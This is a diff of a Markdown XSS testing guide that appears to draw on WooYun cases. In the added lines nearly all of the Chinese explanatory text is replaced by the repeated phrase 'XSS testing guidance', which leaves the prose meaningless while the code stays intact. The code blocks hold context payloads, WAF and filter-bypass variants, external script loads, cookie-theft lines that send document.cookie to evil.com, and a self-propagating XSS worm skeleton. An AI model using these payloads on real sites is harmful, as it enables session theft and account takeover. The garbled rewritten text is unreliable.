@@ -1,45 +1,45 @@
-# Web 安全 - XSS 跨站脚本
+# Web XSS testing guidance - XSS XSS testing guidance
 
-> 来源: WooYun 漏洞库（7,532 XSS 案例）| 拆自 web-injection.md
+> XSS testing guidance: WooYun XSS testing guidance（7,532 XSS XSS testing guidance）| XSS testing guidance web-injection.md
 
-## 二、XSS跨站脚本
+## XSS testing guidance、XSSXSS testing guidance
 
-### 2.1 漏洞本质
+### 2.1 XSS testing guidance
 
 ```
-用户输入(数据) -> 未编码输出 -> 浏览器解析为代码 -> 脚本执行
+XSS testing guidance(XSS testing guidance) -> XSS testing guidance -> XSS testing guidance -> XSS testing guidance
 ```
 
-**核心公式**：XSS = 信任边界突破 + 输出上下文混淆（数据在HTML/JS/CSS/URL中语义变化）
+**XSS testing guidance**：XSS = XSS testing guidance + XSS testing guidance（XSS testing guidanceHTML/JS/CSS/URLXSS testing guidance）
 
-### 2.2 检测方法
+### 2.2 XSS testing guidance
 
-#### 高危输出点
+#### XSS testing guidance
 
-| 输出点 | 触发条件 | 典型场景 |
+| XSS testing guidance | XSS testing guidance | XSS testing guidance |
 |-------|---------|---------|
-| 用户昵称/签名 | 页面加载 | 个人主页、评论、好友列表 |
-| 搜索框回显 | 搜索操作 | 搜索结果页 |
-| 评论/留言 | 内容展示 | 论坛、博客、商品评价 |
-| 文件名/描述 | 文件列表 | 网盘、相册 |
-| 邮件正文/标题 | 打开邮件 | 邮箱系统 |
-| 订单备注 | 后台查看 | 电商后台、工单系统 |
+| XSS testing guidance/XSS testing guidance | XSS testing guidance | XSS testing guidance、XSS testing guidance、XSS testing guidance |
+| XSS testing guidance | XSS testing guidance | XSS testing guidance |
+| XSS testing guidance/XSS testing guidance | XSS testing guidance | XSS testing guidance、XSS testing guidance、XSS testing guidance |
+| XSS testing guidance/XSS testing guidance | XSS testing guidance | XSS testing guidance、XSS testing guidance |
+| XSS testing guidance/XSS testing guidance | XSS testing guidance | XSS testing guidance |
+| XSS testing guidance | XSS testing guidance | XSS testing guidance、XSS testing guidance |
 
-**隐蔽输出点**（易遗漏）：HTTP头(XFF/UA写入日志)、WAP提交PC展示、客户端昵称Web渲染、草稿箱/审核列表
+**XSS testing guidance**（XSS testing guidance）：HTTPXSS testing guidance(XFF/UAXSS testing guidance)、WAPXSS testing guidancePCXSS testing guidance、XSS testing guidanceWebXSS testing guidance、XSS testing guidance/XSS testing guidance
 
-#### 上下文快速判断
+#### XSS testing guidance
 
 ```
-输出在 <script> 内？ -> JS上下文（检查引号类型）
-输出在属性值中？    -> 属性上下文（检查属性类型）
-输出在标签内容中？  -> HTML上下文（检查特殊标签textarea/title）
-输出在URL中？       -> URL上下文（检查协议限制）
-输出在CSS中？       -> CSS上下文（检查expression支持）
+XSS testing guidance <script> XSS testing guidance？ -> JSXSS testing guidance（XSS testing guidance）
+XSS testing guidance？    -> XSS testing guidance（XSS testing guidance）
+XSS testing guidance？  -> HTMLXSS testing guidance（XSS testing guidancetextarea/title）
+XSS testing guidanceURLXSS testing guidance？       -> URLXSS testing guidance（XSS testing guidance）
+XSS testing guidanceCSSXSS testing guidance？       -> CSSXSS testing guidance（XSS testing guidanceexpressionXSS testing guidance）
 ```
 
-### 2.3 上下文Payload
+### 2.3 XSS testing guidancePayload
 
-#### HTML标签内容
+#### HTMLXSS testing guidance
 
 ```html
 <script>alert(1)</script>
@@ -48,7 +48,7 @@
 <iframe src="javascript:alert(1)">
 ```
 
-#### HTML属性值
+#### HTMLXSS testing guidance
 
 ```html
 " onclick=alert(1) "
@@ -57,7 +57,7 @@
 " onmouseover=alert(1) x="
 ```
 
-#### JavaScript字符串
+#### JavaScriptXSS testing guidance
 
 ```javascript
 ';alert(1);//
@@ -66,7 +66,7 @@
 </script><script>alert(1)</script>
 ```
 
-#### URL上下文
+#### URLXSS testing guidance
 
 ```
 javascript:alert(1)
@@ -74,31 +74,31 @@ data:text/html,<script>alert(1)</script>
 data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
 ```
 
-### 2.4 WAF/过滤绕过技巧
+### 2.4 WAF/XSS testing guidance
 
-#### 编码绕过
+#### XSS testing guidance
 
 ```html
-<!-- HTML实体 -->
+<!-- HTMLXSS testing guidance -->
 &#60;script&#62;alert(1)&#60;/script&#62;
 &#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
-<!-- Base64 + data协议 -->
+<!-- Base64 + dataXSS testing guidance -->
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
-<!-- CSS编码(IE) -->
+<!-- CSSXSS testing guidance(IE) -->
 xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
 ```
 
-#### 标签/属性变形
+#### XSS testing guidance/XSS testing guidance
 
 ```html
-<ScRiPt>alert(1)</sCrIpT>              <!-- 大小写混淆 -->
-<script/src=//xss.com/x.js>            <!-- 斜杠替代空格 -->
-<img src=x onerror=alert(1)>           <!-- 无引号 -->
-<scrscriptipt>alert(1)</scrscriptipt>  <!-- 双写绕过 -->
-<scr\x00ipt>alert(1)</script>          <!-- 空字符绕过 -->
+<ScRiPt>alert(1)</sCrIpT>              <!-- XSS testing guidance -->
+<script/src=//xss.com/x.js>            <!-- XSS testing guidance -->
+<img src=x onerror=alert(1)>           <!-- XSS testing guidance -->
+<scrscriptipt>alert(1)</scrscriptipt>  <!-- XSS testing guidance -->
+<scr\x00ipt>alert(1)</script>          <!-- XSS testing guidance -->
 ```
 
-#### 替代事件处理器
+#### XSS testing guidance
 
 ```html
 <img src=x onerror=alert(1)>
@@ -113,75 +113,75 @@ xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
 <body onload=alert(1)>
 ```
 
-#### WAF特定绕过
+#### WAFXSS testing guidance
 
 ```html
-.<script src=http://localhost/1.js>.    <!-- 安全宝：前后加点号 -->
-<!--[if true]><img onerror=alert(1) src=--> <!-- 注释干扰 -->
+.<script src=http://localhost/1.js>.    <!-- XSS testing guidance：XSS testing guidance -->
+<!--[if true]><img onerror=alert(1) src=--> <!-- XSS testing guidance -->
 ```
 
-#### 长度限制绕过
+#### XSS testing guidance
 
 ```html
-<script src=//xss.pw/j>                <!-- 最短外部加载 -->
-<!-- DOM拼接 -->
+<script src=//xss.pw/j>                <!-- XSS testing guidance -->
+<!-- DOMXSS testing guidance -->
 <script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
-<!-- 字符串拼接绕过关键字 -->
+<!-- XSS testing guidance -->
 <script>window['al'+'ert'](1)</script>
 <!-- fromCharCode -->
 <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
 ```
 
-#### HTTPOnly绕过
+#### HTTPOnlyXSS testing guidance
 
-- Flash接口获取用户信息替代Cookie
-- 转为CSRF方式：直接执行敏感操作（改密码、加管理员、读token）
+- FlashXSS testing guidanceCookie
+- XSS testing guidanceCSRFXSS testing guidance：XSS testing guidance（XSS testing guidance、XSS testing guidance、XSS testing guidancetoken）
 
-### 2.5 利用链
+### 2.5 XSS testing guidance
 
-#### Cookie窃取
+#### CookieXSS testing guidance
 
 ```html
-<script>new Image().src="https://evil.com/c?="+document.cookie</script>
-<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
-<script>fetch('https://evil.com/c?='+document.cookie)</script>
+<script>new Image().src="https://evil.com/c ="+document.cookie</script>
+<img src=x onerror="new Image().src='https://evil.com/c ='+document.cookie">
+<script>fetch('https://evil.com/c ='+document.cookie)</script>
 ```
 
-#### DOM XSS关键源与汇
+#### DOM XSSXSS testing guidance
 
-**危险源**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`
+**XSS testing guidance**：`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`
 
-**危险汇**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`
+**XSS testing guidance**：`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`
 
-#### XSS蠕虫核心逻辑
+#### XSSXSS testing guidance
 
 ```javascript
-// 1.获取当前用户身份(cookie/token)
-// 2.构造包含自身payload的内容
-// 3.自动发布/分享（AJAX POST）
-// 4.触发条件：查看/访问即传播
+// 1.XSS testing guidance(cookie/token)
+// 2.XSS testing guidancepayloadXSS testing guidance
+// 3.XSS testing guidance/XSS testing guidance（AJAX POST）
+// 4.XSS testing guidance：XSS testing guidance/XSS testing guidance
 function worm(){
-    jQuery.post("/api/post", {"content": "<自传播payload>"})
+    jQuery.post("/api/post", {"content": "<XSS testing guidancepayload>"})
 }
 worm()
 ```
 
-#### 组合利用模式
+#### XSS testing guidance
 
 ```
-XSS + CSRF -> 获取Token执行管理操作
-XSS + SQLi -> 盲打获取Cookie -> 后台注入
-XSS -> 账号劫持 -> 权限提升 -> 蠕虫传播
-XSS盲打(留言/工单/反馈) -> 获取后台管理员Cookie
+XSS + CSRF -> XSS testing guidanceTokenXSS testing guidance
+XSS + SQLi -> XSS testing guidanceCookie -> XSS testing guidance
+XSS -> XSS testing guidance -> XSS testing guidance -> XSS testing guidance
+XSSXSS testing guidance(XSS testing guidance/XSS testing guidance/XSS testing guidance) -> XSS testing guidanceCookie
 ```
 
-### 2.6 防御措施
+### 2.6 XSS testing guidance
 
-- **输出编码**（核心）：HTML上下文用HTML实体，JS上下文用JS编码，URL上下文用URL编码
-- CSP策略限制脚本来源
-- HTTPOnly保护Cookie
-- 白名单输入验证（避免黑名单，总有遗漏）
-- **常见失误**：只过滤script标签、只过滤小写、前端过滤可抓包绕过、单次过滤被双写绕过
+- **XSS testing guidance**（XSS testing guidance）：HTMLXSS testing guidanceHTMLXSS testing guidance，JSXSS testing guidanceJSXSS testing guidance，URLXSS testing guidanceURLXSS testing guidance
+- CSPXSS testing guidance
+- HTTPOnlyXSS testing guidanceCookie
+- XSS testing guidance（XSS testing guidance，XSS testing guidance）
+- **XSS testing guidance**：XSS testing guidancescriptXSS testing guidance、XSS testing guidance、XSS testing guidance、XSS testing guidance
 
 ---
 
